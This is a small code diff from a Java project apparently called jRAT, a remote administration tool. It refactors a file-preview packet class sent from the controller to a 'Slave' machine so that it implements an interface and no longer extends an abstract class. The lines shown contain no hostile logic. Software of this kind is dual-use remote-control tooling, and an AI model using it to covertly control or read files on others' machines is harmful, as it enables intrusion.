@@ -1,10 +1,10 @@
 package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
 
-public class Packet60PreviewFile extends AbstractOutgoingPacket {
+public class Packet60PreviewFile implements OutgoingPacket {
 
 	private String file;
 	private int line;
